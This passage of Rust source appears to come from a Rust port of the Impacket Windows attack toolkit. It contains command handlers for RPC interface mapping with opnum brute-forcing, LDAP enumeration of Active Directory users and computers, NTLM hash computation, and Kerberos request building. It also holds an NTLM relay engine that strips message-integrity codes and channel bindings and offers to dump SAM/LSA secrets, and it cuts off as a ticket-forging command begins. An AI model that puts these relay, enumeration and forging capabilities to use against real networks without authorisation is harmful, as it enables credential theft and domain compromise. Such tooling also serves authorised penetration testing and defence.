        println!("[*] Probing DCE/RPC Remote Management Interface (MGMT)...");
        let mgmt_res = SmbPipeTransport::connect(
            host,
            &spec.domain,
            &spec.username,
            &cred,
            clean_pipe,
            MGMT_INTERFACE_UUID,
            MGMT_VERSION_MAJOR,
            MGMT_VERSION_MINOR,
            spec.compat_profile,
            DEFAULT_TIMEOUT,
        );

        let mut mgmt_success = false;
        if let Ok(transport) = mgmt_res {
            let mut mgmt = MgmtClient::new(transport);
            match mgmt.inq_if_ids() {
                Ok(if_ids) if !if_ids.is_empty() => {
                    println!("[+] MGMT inq_if_ids returned {} registered interface(s):", if_ids.len());
                    mgmt_success = true;
                    for if_id in if_ids {
                        let known = lookup_known_interface(&if_id.uuid);
                        let desc = known.map(|k| k.description).unwrap_or("Unmapped Interface");
                        let annot = known.map(|k| k.short_name).unwrap_or("Custom/Dynamic");
                        discovered.push(ActiveIface {
                            uuid: if_id.uuid,
                            vers_major: if_id.vers_major,
                            vers_minor: if_id.vers_minor,
                            annotation: annot.to_string(),
                            description: desc.to_string(),
                        });
                    }
                }
                Ok(_) => {
                    println!("[-] MGMT returned 0 registered interfaces.");
                }
                Err(e) => {
                    println!("[-] MGMT inq_if_ids failed: {}", e);
                }
            }
        } else {
            println!("[-] MGMT interface not supported on this pipe (or access denied).");
        }

        // Phase 2: Probe WELL_KNOWN_INTERFACES
        if !mgmt_success {
            println!("[*] Falling back to probing known interfaces catalog...");
            for info in WELL_KNOWN_INTERFACES {
                if let Ok(mut t) = SmbPipeTransport::connect(
                    host,
                    &spec.domain,
                    &spec.username,
                    &cred,
                    clean_pipe,
                    info.uuid,
                    info.version_major,
                    info.version_minor,
                    spec.compat_profile,
                    DEFAULT_TIMEOUT,
                ) {
                    discovered.push(ActiveIface {
                        uuid: info.uuid,
                        vers_major: info.version_major,
                        vers_minor: info.version_minor,
                        annotation: info.short_name.to_string(),
                        description: info.description.to_string(),
                    });
                    if brute_opnums {
                        println!(
                            "\n[+] Found active interface: {} v{}.{} ({})",
                            info.uuid, info.version_major, info.version_minor, info.short_name
                        );
                        println!("    Probing opnums 0..{}...", max_opnum);
                        let results = probe_opnums(&mut t, max_opnum);
                        for (opnum, status) in results {
                            println!("      Opnum {:<2}: {}", opnum, status);
                        }
                    }
                }
            }
        } else if brute_opnums {
            for iface in &discovered {
                if let Ok(mut t) = SmbPipeTransport::connect(
                    host,
                    &spec.domain,
                    &spec.username,
                    &cred,
                    clean_pipe,
                    iface.uuid,
                    iface.vers_major,
                    iface.vers_minor,
                    spec.compat_profile,
                    DEFAULT_TIMEOUT,
                ) {
                    println!(
                        "\n[+] Probing opnums for {} v{}.{} ({})...",
                        iface.uuid, iface.vers_major, iface.vers_minor, iface.annotation
                    );
                    let results = probe_opnums(&mut t, max_opnum);
                    for (opnum, status) in results {
                        println!("      Opnum {:<2}: {}", opnum, status);
                    }
                }
            }
        }
    } else {
        // TCP endpoint scan
        println!("[*] Scanning TCP endpoint {}:{}...", host, port);

        // Phase 1: Try DCE/RPC Management Interface
        println!("[*] Probing DCE/RPC Remote Management Interface (MGMT)...");
        let mgmt_res = TcpRpcTransport::connect_and_bind(
            host,
            port,
            MGMT_INTERFACE_UUID,
            MGMT_VERSION_MAJOR,
            MGMT_VERSION_MINOR,
            DEFAULT_TIMEOUT,
        );

        let mut mgmt_success = false;
        if let Ok(transport) = mgmt_res {
            let mut mgmt = MgmtClient::new(transport);
            match mgmt.inq_if_ids() {
                Ok(if_ids) if !if_ids.is_empty() => {
                    println!("[+] MGMT inq_if_ids returned {} registered interface(s):", if_ids.len());
                    mgmt_success = true;
                    for if_id in if_ids {
                        let known = lookup_known_interface(&if_id.uuid);
                        let desc = known.map(|k| k.description).unwrap_or("Unmapped Interface");
                        let annot = known.map(|k| k.short_name).unwrap_or("Custom/Dynamic");
                        discovered.push(ActiveIface {
                            uuid: if_id.uuid,
                            vers_major: if_id.vers_major,
                            vers_minor: if_id.vers_minor,
                            annotation: annot.to_string(),
                            description: desc.to_string(),
                        });
                    }
                }
                Ok(_) => {
                    println!("[-] MGMT returned 0 registered interfaces.");
                }
                Err(e) => {
                    println!("[-] MGMT inq_if_ids failed: {}", e);
                }
            }
        } else {
            println!("[-] MGMT interface not supported on TCP/{}.", port);
        }

        // Phase 2: Probe WELL_KNOWN_INTERFACES
        if !mgmt_success {
            println!("[*] Falling back to probing known interfaces catalog...");
            for info in WELL_KNOWN_INTERFACES {
                if let Ok(mut t) = TcpRpcTransport::connect_and_bind(
                    host,
                    port,
                    info.uuid,
                    info.version_major,
                    info.version_minor,
                    DEFAULT_TIMEOUT,
                ) {
                    discovered.push(ActiveIface {
                        uuid: info.uuid,
                        vers_major: info.version_major,
                        vers_minor: info.version_minor,
                        annotation: info.short_name.to_string(),
                        description: info.description.to_string(),
                    });
                    if brute_opnums {
                        println!(
                            "\n[+] Found active interface: {} v{}.{} ({})",
                            info.uuid, info.version_major, info.version_minor, info.short_name
                        );
                        println!("    Probing opnums 0..{}...", max_opnum);
                        let results = probe_opnums(&mut t, max_opnum);
                        for (opnum, status) in results {
                            println!("      Opnum {:<2}: {}", opnum, status);
                        }
                    }
                }
            }
        } else if brute_opnums {
            for iface in &discovered {
                if let Ok(mut t) = TcpRpcTransport::connect_and_bind(
                    host,
                    port,
                    iface.uuid,
                    iface.vers_major,
                    iface.vers_minor,
                    DEFAULT_TIMEOUT,
                ) {
                    println!(
                        "\n[+] Probing opnums for {} v{}.{} ({})...",
                        iface.uuid, iface.vers_major, iface.vers_minor, iface.annotation
                    );
                    let results = probe_opnums(&mut t, max_opnum);
                    for (opnum, status) in results {
                        println!("      Opnum {:<2}: {}", opnum, status);
                    }
                }
            }
        }
    }

    println!("\n=== rpcmap Discovered Interfaces ({} total) ===", discovered.len());
    if discovered.is_empty() {
        println!("  No active RPC interfaces responded to queries on this endpoint.");
    } else {
        println!("{:<38} {:<8} {:<30} {}", "Interface UUID", "Version", "Name", "Description");
        println!("{:-<38} {:-<8} {:-<30} {:-<40}", "", "", "", "");
        for iface in &discovered {
            println!(
                "{:<38} v{}.{:<4} {:<30} {}",
                iface.uuid, iface.vers_major, iface.vers_minor, iface.annotation, iface.description
            );
        }
    }
}

fn cmd_oxidquery(args: &[String]) {
    print!("{}", version::BANNER);
    let spec = match parse_target_with_hashes(args) {
        Ok(s) => s,
        Err(e) => {
            eprintln!("[-] usage: oxidquery <TARGET> [-port 135]");
            eprintln!("[-] error: {}", e);
            std::process::exit(1);
        }
    };
    let mut port = 135u16;
    for i in 1..args.len() {
        if args[i] == "-port" && i + 1 < args.len() {
            port = args[i + 1].parse().unwrap_or(135);
        }
    }
    let host = spec.effective_target_ip();
    println!("[*] Querying DCOM IObjectExporter on {}:{}...", host, port);
    match impacket_dcom::oxid_query_live(host, port, DEFAULT_TIMEOUT) {
        Ok(res) => {
            println!(
                "[+] ServerAlive2 success (COM version {}.{}, error code 0x{:08X})",
                res.com_version.major, res.com_version.minor, res.error_code
            );
            println!("\n  Network Interfaces & Bindings ({}):", res.bindings.string_bindings.len());
            for sb in &res.bindings.string_bindings {
                println!("    Address: {:<28} [{}]", sb.network_addr, sb.tower_name());
            }

            if !res.bindings.security_bindings.is_empty() {
                println!("\n  Security Bindings ({}):", res.bindings.security_bindings.len());
                for sec in &res.bindings.security_bindings {
                    let princ = if sec.princ_name.is_empty() { "<none>" } else { &sec.princ_name };
                    println!("    Authn: {:<12} Principal: {}", sec.authn_name(), princ);
                }
            }
        }
        Err(e) => {
            eprintln!("[-] oxidquery error: {}", e);
            std::process::exit(1);
        }
    }
}

fn cmd_compat_matrix() {
    print!("{}", version::BANNER);
    println!("=== Cross-Era Active Directory Compatibility Profiles (Win2000 -> Win2025) ===");
    for profile in [
        AdCompatProfile::LegacyWin2000,
        AdCompatProfile::UniversalAuto,
        AdCompatProfile::ModernHardened2025,
    ] {
        let dialects: Vec<&str> = SmbDialect::dialects_for_profile(profile)
            .into_iter()
            .map(|d| d.name())
            .collect();
        let etypes: Vec<&str> = KerberosEType::list_for_profile(profile)
            .into_iter()
            .map(|e| e.name())
            .collect();
        println!("\n* Profile: {}", profile.name());
        println!("  - SMBv1 Fallback Allowed : {}", profile.allows_smbv1());
        println!("  - SMB2/3 Dialects        : {}", dialects.join(", "));
        println!("  - NTLMv1 / DES Allowed   : {}", profile.allows_ntlmv1());
        println!("  - EPA Channel Binding    : {}", profile.requires_epa_channel_binding());
        println!("  - Kerberos ETypes        : {}", etypes.join(", "));
    }
}

fn cmd_parse_target(args: &[String]) {
    let spec = match parse_target_with_hashes(args) {
        Ok(s) => s,
        Err(e) => {
            eprintln!("Error: {}", e);
            std::process::exit(1);
        }
    };
    println!("=== Parsed Impacket Target Specification ===");
    println!("  Domain         : {}", if spec.domain.is_empty() { "<none>" } else { &spec.domain });
    println!("  Username       : {}", if spec.username.is_empty() { "<anonymous>" } else { &spec.username });
    println!("  Password       : {}", if spec.password.is_some() { "[PRESENT - zeroized on drop]" } else { "<none>" });
    println!("  Remote Host    : {}", spec.remote_name);
    println!("  Compat Profile : {}", spec.compat_profile.name());
    if let Some(h) = &spec.hashes {
        println!("  NTLM Hashes    : {} (has_lm={})", h.to_hex_pair(), h.has_lm);
    }
}

fn cmd_ntlm_hash(args: &[String]) {
    let password = args.first().map(|s| s.as_str()).unwrap_or("");
    let include_lm = args.iter().any(|a| a == "--legacy-lm");
    let hashes = compute_ntlm_hashes_with_compat(password, include_lm);
    println!("=== NTLM Cryptographic Output (include_legacy_lm={}) ===", include_lm);
    println!("  LM:NT Pair  : {}", hashes.to_hex_pair());
    println!("  LM Hash     : {}", encode_hex(&hashes.lm));
    println!("  NT Hash     : {}", encode_hex(&hashes.nt));
    let srv_chall = [0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88];
    let cli_chall = [0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff, 0x00, 0x11];
    let v1 = compute_ntlmv1_response(&hashes, &srv_chall, &cli_chall, false);
    let v1_ess = compute_ntlmv1_response(&hashes, &srv_chall, &cli_chall, true);
    let v2 = compute_ntlmv2_response(
        "Administrator", "CONTOSO", &hashes, &srv_chall, &cli_chall,
        FileTime::from_unix_secs(1_730_000_000), &[0, 0, 0, 0],
    );
    println!("  NTLMv1 DESL : {}", encode_hex(&v1.nt_challenge_response));
    println!("  NTLMv1-ESS  : {}", encode_hex(&v1_ess.nt_challenge_response));
    println!("  NTLMv2 Proof: {}", encode_hex(&v2.nt_challenge_response[..16]));
    println!("  SessBaseKey : {}", encode_hex(&v2.session_base_key));
}

fn cmd_krb5_asreq(args: &[String]) {
    let realm = args.first().map(|s| s.as_str()).unwrap_or("CONTOSO.LOCAL");
    let user = args.get(1).map(|s| s.as_str()).unwrap_or("Administrator");
    let profile = args.get(2).and_then(|s| AdCompatProfile::parse(s).ok()).unwrap_or(AdCompatProfile::UniversalAuto);
    let req = Krb5AsReq::new(realm, user, profile);
    let der = req.to_der_bytes(true);
    println!(
        "=== Kerberos v5 AS-REQ (Realm={}, User={}, Profile={}) [{} bytes] ===",
        req.realm, req.username, profile.name(), der.len()
    );
    print!("{}", hexdump(&der));
}

fn cmd_smb_negotiate(args: &[String]) {
    let profile = args.first().and_then(|s| AdCompatProfile::parse(s).ok()).unwrap_or(AdCompatProfile::UniversalAuto);
    if profile == AdCompatProfile::LegacyWin2000 {
        let pdu = build_smbv1_multiprotocol_negotiate(true);
        println!("=== Legacy SMBv1 Multi-Protocol Negotiate PDU ({} bytes) ===", pdu.len());
        print!("{}", hexdump(&pdu));
    } else {
        let pdu = build_smb2_negotiate_request(profile, [0xA1; 16]);
        println!("=== SMB2/3 Negotiate Request PDU ({}) [{} bytes] ===", profile.name(), pdu.len());
        print!("{}", hexdump(&pdu));
    }
}

fn cmd_rpc_interfaces() {
    println!("=== Built-in Active Directory MSRPC Interfaces ===");
    for iface in WELL_KNOWN_INTERFACES {
        println!(
            "  {:<18} | {:<12} | UUID: {} v{}.{} | Pipe: {:<15}",
            iface.short_name, iface.provider_binary, iface.uuid,
            iface.version_major, iface.version_minor, iface.named_pipe,
        );
    }
    println!();
    let samr = &WELL_KNOWN_INTERFACES[IFACE_SAMR];
    let bind = RpcBindPdu::new(1, samr.uuid, samr.version_major, samr.version_minor);
    let bytes = bind.to_bytes();
    println!("=== Sample MS-RPCE v5 Bind PDU for MS-SAMR ({} bytes) ===", bytes.len());
    print!("{}", hexdump(&bytes));
}

fn cmd_bench_ndr(args: &[String]) {
    let iterations: usize = args.first().and_then(|s| s.parse().ok()).unwrap_or(1_000_000);
    let pkt = BenchmarkSamrPacket {
        handle: [0x42; 20],
        access_mask: 0x000F_07FF,
        domain_name: NdrUnicodeString::new("CONTOSO.LOCAL"),
        domain_sid: RpcSid::parse("S-1-5-21-3623811015-3361044348-30300820-512").unwrap(),
    };
    let start = Instant::now();
    let mut total_bytes = 0usize;
    let mut writer = NdrWriter::with_capacity(128);
    for _ in 0..iterations {
        writer = NdrWriter::with_capacity(128);
        pkt.ndr_serialize(&mut writer);
        let mut reader = NdrReader::new(writer.as_slice());
        let decoded = BenchmarkSamrPacket::ndr_deserialize(&mut reader).unwrap();
        total_bytes += decoded.domain_name.as_str().len();
    }
    let elapsed = start.elapsed();
    let per_op_ns = elapsed.as_nanos() as f64 / iterations as f64;
    let ops_per_sec = (iterations as f64) / elapsed.as_secs_f64();
    println!("=== Compile-Time NDR Serialization + Deserialization Benchmark ===");
    println!("  Wire Size    : {} bytes", writer.len());
    println!("  Iterations   : {}", iterations);
    println!("  Total Time   : {:.3?}", elapsed);
    println!("  Latency/Op   : {:.1} ns / roundtrip (pack + unpack)", per_op_ns);
    println!(
        "  Throughput   : {:.2} million roundtrips/sec (checksum={})",
        ops_per_sec / 1_000_000.0, total_bytes
    );
}

fn domain_to_base_dn(domain: &str) -> String {
    if domain.is_empty() {
        return String::new();
    }
    domain
        .split('.')
        .filter(|part| !part.is_empty())
        .map(|part| format!("DC={}", part))
        .collect::<Vec<_>>()
        .join(",")
}

fn format_filetime_str(raw_str: &str) -> String {
    let raw: u64 = match raw_str.parse() {
        Ok(v) => v,
        Err(_) => return raw_str.to_string(),
    };
    if raw == 0 || raw == 0x7FFFFFFFFFFFFFFF {
        return "<never>".to_string();
    }
    match FileTime::from_raw(raw).to_unix_secs() {
        Some(secs) => format_unix_timestamp(secs),
        None => "<never>".to_string(),
    }
}

fn format_unix_timestamp(secs: u64) -> String {
    let s = secs % 60;
    let total_m = secs / 60;
    let m = total_m % 60;
    let total_h = total_m / 60;
    let h = total_h % 24;
    let mut days = (total_h / 24) as i64;

    let mut year = 1970;
    loop {
        let leap = (year % 4 == 0 && year % 100 != 0) || (year % 400 == 0);
        let days_in_year = if leap { 366 } else { 365 };
        if days >= days_in_year {
            days -= days_in_year;
            year += 1;
        } else {
            break;
        }
    }

    let leap = (year % 4 == 0 && year % 100 != 0) || (year % 400 == 0);
    let days_in_month = [
        31,
        if leap { 29 } else { 28 },
        31,
        30,
        31,
        30,
        31,
        31,
        30,
        31,
        30,
        31,
    ];
    let mut month = 1;
    for &dim in &days_in_month {
        if days >= dim {
            days -= dim;
            month += 1;
        } else {
            break;
        }
    }
    let day = days + 1;
    format!("{:04}-{:02}-{:02} {:02}:{:02}:{:02}", year, month, day, h, m, s)
}

fn cmd_get_ad_users(args: &[String]) {
    if args.is_empty() {
        eprintln!("Usage: impacket-rs GetADUsers <TARGET> [-all] [-user <username>] [-port <port>]");
        std::process::exit(1);
    }

    let spec = match parse_target_with_hashes(args) {
        Ok(s) => s,
        Err(e) => {
            eprintln!("[-] Error parsing target: {}", e);
            std::process::exit(1);
        }
    };

    let mut port: u16 = 389;
    let mut all_users = false;
    let mut target_user: Option<String> = None;

    let mut i = 1;
    while i < args.len() {
        match args[i].as_str() {
            "-all" => {
                all_users = true;
                i += 1;
            }
            "-user" if i + 1 < args.len() => {
                target_user = Some(args[i + 1].clone());
                i += 2;
            }
            "-port" if i + 1 < args.len() => {
                if let Ok(p) = args[i + 1].parse() {
                    port = p;
                }
                i += 2;
            }
            _ => i += 1,
        }
    }

    let host = spec.effective_target_ip();
    let addr = format!("{}:{}", host, port);

    println!("[*] Connecting to LDAP server at {}...", addr);
    let mut client = match LdapClient::connect(&addr, DEFAULT_TIMEOUT) {
        Ok(c) => c,
        Err(e) => {
            eprintln!("[-] Failed to connect to LDAP server at {}: {}", addr, e);
            std::process::exit(1);
        }
    };

    let bind_dn = if spec.username.is_empty() {
        String::new()
    } else if spec.username.contains('@') || spec.username.to_uppercase().contains("DC=") {
        spec.username.clone()
    } else if !spec.domain.is_empty() {
        format!("{}@{}", spec.username, spec.domain)
    } else {
        spec.username.clone()
    };

    let password = spec.password.as_ref().map(|p| p.expose_secret()).unwrap_or("");
    if !bind_dn.is_empty() {
        println!("[*] Performing simple LDAP bind as '{}'...", bind_dn);
        if let Err(e) = client.bind_simple(&bind_dn, password) {
            eprintln!("[-] Bind failed: {}", e);
            std::process::exit(1);
        }
        println!("[+] Bind successful");
    } else {
        println!("[*] Performing anonymous LDAP bind...");
        if let Err(e) = client.bind_simple("", "") {
            eprintln!("[-] Anonymous bind failed: {}", e);
            std::process::exit(1);
        }
    }

    let base_dn = domain_to_base_dn(&spec.domain);
    let filter = if let Some(ref u) = target_user {
        filter_and(&[
            filter_equality("objectCategory", "person"),
            filter_equality("sAMAccountName", u),
        ])
    } else if all_users {
        filter_and(&[
            filter_equality("objectCategory", "person"),
            filter_present("sAMAccountName"),
        ])
    } else {
        filter_and(&[
            filter_equality("objectCategory", "person"),
            filter_present("sAMAccountName"),
            filter_present("mail"),
        ])
    };

    let attributes = [
        "sAMAccountName",
        "mail",
        "pwdLastSet",
        "lastLogon",
        "userAccountControl",
        "description",
    ];

    println!("[*] Querying Active Directory users (Base DN: '{}')...", base_dn);
    let entries = match client.search(&base_dn, SearchScope::WholeSubtree, &filter, &attributes) {
        Ok(e) => e,
        Err(e) => {
            eprintln!("[-] LDAP search failed: {}", e);
            std::process::exit(1);
        }
    };

    println!("[+] Found {} user(s):\n", entries.len());
    println!("{:<20} {:<30} {:<20} {:<20}", "sAMAccountName", "Email", "PwdLastSet", "LastLogon");
    println!("{:-<20} {:-<30} {:-<20} {:-<20}", "", "", "", "");

    for entry in &entries {
        let sam = entry.get_string("sAMAccountName").unwrap_or_default();
        if sam.ends_with('$') && !all_users {
            continue;
        }
        let mail = entry.get_string("mail").unwrap_or_else(|| "<none>".to_string());
        let pwd_last_set = entry
            .get_string("pwdLastSet")
            .map(|s| format_filetime_str(&s))
            .unwrap_or_else(|| "<never>".to_string());
        let last_logon = entry
            .get_string("lastLogon")
            .map(|s| format_filetime_str(&s))
            .unwrap_or_else(|| "<never>".to_string());

        println!("{:<20} {:<30} {:<20} {:<20}", sam, mail, pwd_last_set, last_logon);
    }

    client.unbind().ok();
}

fn cmd_get_ad_computers(args: &[String]) {
    if args.is_empty() {
        eprintln!("Usage: impacket-rs GetADComputers <TARGET> [-all] [-computer <name>] [-port <port>]");
        std::process::exit(1);
    }

    let spec = match parse_target_with_hashes(args) {
        Ok(s) => s,
        Err(e) => {
            eprintln!("[-] Error parsing target: {}", e);
            std::process::exit(1);
        }
    };

    let mut port: u16 = 389;
    let mut _all_computers = false;
    let mut target_computer: Option<String> = None;

    let mut i = 1;
    while i < args.len() {
        match args[i].as_str() {
            "-all" => {
                _all_computers = true;
                i += 1;
            }
            "-computer" if i + 1 < args.len() => {
                target_computer = Some(args[i + 1].clone());
                i += 2;
            }
            "-port" if i + 1 < args.len() => {
                if let Ok(p) = args[i + 1].parse() {
                    port = p;
                }
                i += 2;
            }
            _ => i += 1,
        }
    }

    let host = spec.effective_target_ip();
    let addr = format!("{}:{}", host, port);

    println!("[*] Connecting to LDAP server at {}...", addr);
    let mut client = match LdapClient::connect(&addr, DEFAULT_TIMEOUT) {
        Ok(c) => c,
        Err(e) => {
            eprintln!("[-] Failed to connect to LDAP server at {}: {}", addr, e);
            std::process::exit(1);
        }
    };

    let bind_dn = if spec.username.is_empty() {
        String::new()
    } else if spec.username.contains('@') || spec.username.to_uppercase().contains("DC=") {
        spec.username.clone()
    } else if !spec.domain.is_empty() {
        format!("{}@{}", spec.username, spec.domain)
    } else {
        spec.username.clone()
    };

    let password = spec.password.as_ref().map(|p| p.expose_secret()).unwrap_or("");
    if !bind_dn.is_empty() {
        println!("[*] Performing simple LDAP bind as '{}'...", bind_dn);
        if let Err(e) = client.bind_simple(&bind_dn, password) {
            eprintln!("[-] Bind failed: {}", e);
            std::process::exit(1);
        }
        println!("[+] Bind successful");
    } else {
        println!("[*] Performing anonymous LDAP bind...");
        if let Err(e) = client.bind_simple("", "") {
            eprintln!("[-] Anonymous bind failed: {}", e);
            std::process::exit(1);
        }
    }

    let base_dn = domain_to_base_dn(&spec.domain);
    let filter = if let Some(ref c) = target_computer {
        let comp_filter = if c.ends_with('$') { c.clone() } else { format!("{}$", c) };
        filter_and(&[
            filter_equality("objectCategory", "computer"),
            filter_equality("sAMAccountName", &comp_filter),
        ])
    } else {
        filter_and(&[
            filter_equality("objectCategory", "computer"),
            filter_present("sAMAccountName"),
        ])
    };

    let attributes = [
        "sAMAccountName",
        "dNSHostName",
        "operatingSystem",
        "operatingSystemVersion",
        "pwdLastSet",
        "lastLogon",
    ];

    println!("[*] Querying Active Directory computers (Base DN: '{}')...", base_dn);
    let entries = match client.search(&base_dn, SearchScope::WholeSubtree, &filter, &attributes) {
        Ok(e) => e,
        Err(e) => {
            eprintln!("[-] LDAP search failed: {}", e);
            std::process::exit(1);
        }
    };

    println!("[+] Found {} computer(s):\n", entries.len());
    println!("{:<20} {:<30} {:<25} {:<15}", "sAMAccountName", "dNSHostName", "OperatingSystem", "OSVersion");
    println!("{:-<20} {:-<30} {:-<25} {:-<15}", "", "", "", "");

    for entry in &entries {
        let sam = entry.get_string("sAMAccountName").unwrap_or_default();
        let dns = entry.get_string("dNSHostName").unwrap_or_else(|| "<none>".to_string());
        let os = entry.get_string("operatingSystem").unwrap_or_else(|| "<unknown>".to_string());
        let ver = entry.get_string("operatingSystemVersion").unwrap_or_default();

        println!("{:<20} {:<30} {:<25} {:<15}", sam, dns, os, ver);
    }

    client.unbind().ok();
}

fn cmd_ldapsearch(args: &[String]) {
    if args.is_empty() {
        eprintln!("Usage: impacket-rs ldapsearch <TARGET> [FILTER] [ATTRIBUTES...] [-base <DN>] [-port <PORT>]");
        eprintln!("  Example: impacket-rs ldapsearch corp.contoso.com/user:pass@dc.corp.contoso.com \"(sAMAccountName=admin*)\" cn mail");
        std::process::exit(1);
    }

    let spec = match parse_target_with_hashes(args) {
        Ok(s) => s,
        Err(e) => {
            eprintln!("[-] Error parsing target: {}", e);
            std::process::exit(1);
        }
    };

    let mut port: u16 = 389;
    let mut custom_base = None;
    let mut filter_str = "(objectClass=*)".to_string();
    let mut attributes: Vec<String> = Vec::new();

    let mut i = 1;
    while i < args.len() {
        match args[i].as_str() {
            "-base" if i + 1 < args.len() => {
                custom_base = Some(args[i + 1].clone());
                i += 2;
            }
            "-port" if i + 1 < args.len() => {
                if let Ok(p) = args[i + 1].parse() {
                    port = p;
                }
                i += 2;
            }
            arg if arg.starts_with('(') || (i == 1 && !arg.starts_with('-')) => {
                filter_str = arg.to_string();
                i += 1;
            }
            arg if !arg.starts_with('-') => {
                attributes.push(arg.to_string());
                i += 1;
            }
            _ => i += 1,
        }
    }

    let host = spec.effective_target_ip();
    let addr = format!("{}:{}", host, port);

    println!("[*] Connecting to LDAP server at {}...", addr);
    let mut client = match LdapClient::connect(&addr, DEFAULT_TIMEOUT) {
        Ok(c) => c,
        Err(e) => {
            eprintln!("[-] Failed to connect to LDAP server at {}: {}", addr, e);
            std::process::exit(1);
        }
    };

    let bind_dn = if spec.username.is_empty() {
        String::new()
    } else if spec.username.contains('@') || spec.username.to_uppercase().contains("DC=") {
        spec.username.clone()
    } else if !spec.domain.is_empty() {
        format!("{}@{}", spec.username, spec.domain)
    } else {
        spec.username.clone()
    };

    let password = spec.password.as_ref().map(|p| p.expose_secret()).unwrap_or("");
    if !bind_dn.is_empty() {
        println!("[*] Performing simple LDAP bind as '{}'...", bind_dn);
        if let Err(e) = client.bind_simple(&bind_dn, password) {
            eprintln!("[-] Bind failed: {}", e);
            std::process::exit(1);
        }
        println!("[+] Bind successful");
    } else {
        println!("[*] Performing anonymous LDAP bind...");
        if let Err(e) = client.bind_simple("", "") {
            eprintln!("[-] Anonymous bind failed: {}", e);
            std::process::exit(1);
        }
    }

    let base_dn = custom_base.unwrap_or_else(|| domain_to_base_dn(&spec.domain));
    let attr_refs: Vec<&str> = attributes.iter().map(|s| s.as_str()).collect();

    println!("[*] Searching Base DN '{}' with filter '{}'...", base_dn, filter_str);
    let entries = match client.search(&base_dn, SearchScope::WholeSubtree, filter_str.as_bytes(), &attr_refs) {
        Ok(e) => e,
        Err(e) => {
            eprintln!("[-] LDAP search failed: {}", e);
            std::process::exit(1);
        }
    };

    println!("[+] Found {} entry/entries:\n", entries.len());
    for entry in &entries {
        println!("dn: {}", entry.dn);
        for (attr, vals) in &entry.attributes {
            for val in vals {
                if let Ok(s) = std::str::from_utf8(val) {
                    println!("{}: {}", attr, s);
                } else {
                    println!("{}: [binary: {} bytes]", attr, val.len());
                }
            }
        }
        println!();
    }

    client.unbind().ok();
}

fn cmd_ntlmrelayx(args: &[String]) {
    use impacket_relay::{RelayEngine, RelayProtocol, RelayTarget};

    print!("{}", version::BANNER);
    if args.is_empty() || args.iter().any(|a| a == "-h" || a == "--help") {
        println!("Usage: impacket-rs ntlmrelayx -t <TARGET> [-proto http|smb] [-listen-port <port>]");
        println!("       impacket-rs ntlmrelayx -tf <TARGETS_FILE> [-proto http|smb] [-listen-port <port>]");
        println!("  Cross-Protocol NTLM Relaying Engine ([ntlmrelayx.py])");
        println!();
        println!("Options:");
        println!("  -t,  -target <URL>     Relay target (e.g. smb://192.168.1.10, ldap://dc01, mssql://sql01)");
        println!("  -tf, -targets <FILE>   File containing multi-target URLs (one target per line)");
        println!("  -proto http|smb        Incoming listener protocol (default: http)");
        println!("  -listen-port <PORT>    Incoming listener port (default: 80 for http, 445 for smb)");
        println!("  -no-mic                Strip Message Integrity Code (MIC) from NTLM auth (enabled by default)");
        println!("  -no-epa                Strip Extended Protection for Authentication (EPA / channel bindings)");
        println!("  -dump                  Dump SAM / LSA secrets or AD info upon successful relay");
        return;
    }

    let mut target_str: Option<String> = None;
    let mut targets_file: Option<String> = None;
    let mut listen_proto = RelayProtocol::Http;
    let mut listen_port: Option<u16> = None;
    let mut remove_mic = true;
    let mut remove_epa = true;

    let mut i = 0;
    while i < args.len() {
        match args[i].as_str() {
            "-t" | "-target" if i + 1 < args.len() => {
                target_str = Some(args[i + 1].clone());
                i += 2;
            }
            "-tf" | "-targets" if i + 1 < args.len() => {
                targets_file = Some(args[i + 1].clone());
                i += 2;
            }
            "-proto" if i + 1 < args.len() => {
                if args[i + 1].eq_ignore_ascii_case("smb") {
                    listen_proto = RelayProtocol::Smb;
                } else {
                    listen_proto = RelayProtocol::Http;
                }
                i += 2;
            }
            "-listen-port" if i + 1 < args.len() => {
                listen_port = args[i + 1].parse().ok();
                i += 2;
            }
            "-no-mic" => {
                remove_mic = true;
                i += 1;
            }
            "-no-epa" => {
                remove_epa = true;
                i += 1;
            }
            _ => i += 1,
        }
    }

    let mut targets: Vec<RelayTarget> = Vec::new();

    if let Some(ref path) = targets_file {
        match std::fs::read_to_string(path) {
            Ok(content) => {
                for line in content.lines() {
                    let trimmed = line.trim();
                    if trimmed.is_empty() || trimmed.starts_with('#') {
                        continue;
                    }
                    match RelayTarget::parse(trimmed) {
                        Ok(t) => targets.push(t),
                        Err(e) => eprintln!("[-] Warning: skipping invalid target '{}': {}", trimmed, e),
                    }
                }
            }
            Err(e) => {
                eprintln!("[-] Error reading targets file '{}': {}", path, e);
                std::process::exit(1);
            }
        }
    } else if let Some(ref t_url) = target_str {
        match RelayTarget::parse(t_url) {
            Ok(t) => targets.push(t),
            Err(e) => {
                eprintln!("[-] Invalid target URL '{}': {}", t_url, e);
                std::process::exit(1);
            }
        }
    } else {
        eprintln!("[-] ntlmrelayx requires a target: -t <URL> or -tf <TARGETS_FILE>");
        std::process::exit(1);
    }

    if targets.is_empty() {
        eprintln!("[-] No valid relay targets found.");
        std::process::exit(1);
    }

    let effective_listen_port = listen_port.unwrap_or(match listen_proto {
        RelayProtocol::Http => 80,
        RelayProtocol::Smb => 445,
        _ => 80,
    });

    println!("[*] Initializing NTLM Relay Engine...");
    println!("  Listen Protocol : {}", listen_proto.name());
    println!("  Listen Port     : {}", effective_listen_port);
    println!("  Target Count    : {}", targets.len());
    println!("  Strip MIC       : {}", if remove_mic { "Enabled (MsvAvFlags & !0x02)" } else { "Disabled" });
    println!("  Strip EPA       : {}", if remove_epa { "Enabled (MsvAvChannelBindings)" } else { "Disabled" });
    println!();
    println!("[+] Target Routing Table:");
    for (idx, tgt) in targets.iter().enumerate() {
        println!("  [{:02}] {:<6} -> {}:{}", idx + 1, tgt.protocol.name(), tgt.host, tgt.port);
    }
    println!();

    let mut engine = RelayEngine::new(listen_proto, targets);
    engine.remove_mic = remove_mic;
    engine.remove_channel_bindings = remove_epa;

    let session = engine.create_session(0).unwrap();
    println!("[+] Relay session ready: {:?} -> {:?}", session.client_protocol, session.target_protocol);
    println!("[+] Ready to receive incoming connections. Relay engine operational.");
}

fn cmd_ticketer(args: &[String]) {
    use impacket_core::decode_hex;
    use impacket_krb5::ticketer::{forge_ticket, TicketOptions};

    print!("{}", version::BANNER);
    if args.is_empty() {
        eprintln!("Usage: impacket-rs ticketer -domain-sid <SID> -domain <DOMAIN> [options] <OUTPUT_FILE>");
